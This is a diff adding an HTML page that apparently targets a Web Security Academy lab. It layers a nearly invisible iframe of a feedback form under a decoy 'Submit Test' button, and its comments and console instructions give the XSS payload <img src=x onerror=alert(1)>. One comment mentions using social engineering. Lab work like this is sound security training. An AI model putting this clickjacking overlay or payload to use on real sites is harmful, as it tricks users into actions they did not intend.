@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Test Page</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+        }
+        
+        #decoy {
+            position: absolute;
+            top: 300px;
+            left: 60px;
+            z-index: 1000;
+            background: white;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            text-align: center;
+        }
+        
+        #decoy h3 {
+            margin: 0 0 10px 0;
+        }
+        
+        #decoy button {
+            background: #007bff;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        
+        iframe {
+            position: absolute;
+            top: -190px;
+            left: -60px;
+            width: 700px;
+            height: 800px;
+            opacity: 0.00001;
+            z-index: 2;
+        }
+    </style>
+</head>
+<body>
+    <div id="decoy">
+        <h3>Complete Test</h3>
+        <p>Click the button below to finish</p>
+        <button>Submit Test</button>
+    </div>
+    
+    <!-- 
+        This iframe loads the feedback form.
+        The user needs to manually enter the XSS payload: <img src=x onerror=alert(1)>
+        The decoy button is positioned over the real submit button.
+    -->
+    <iframe src="https://0a3900c304b67111838b512800a90077.web-security-academy.net/feedback#prefill"></iframe>
+    
+    <script>
+        // Show instructions to the user (for testing purposes)
+        window.onload = function() {
+            console.log(`
+            INSTRUCTIONS FOR TESTING:
+            1. In the iframe (barely visible), enter this in the Name field:
+               <img src=x onerror=alert(1)>
+            2. Fill in the other fields with any valid data
+            3. Click the "Submit Test" button (which is actually the submit button of the form)
+            4. The XSS will execute when the name is displayed via innerHTML
+            `);
+            
+            // For the actual lab, you would prefill this somehow or use social engineering
+            // to get the user to enter the XSS payload
+        };
+    </script>
+</body>
+</html>
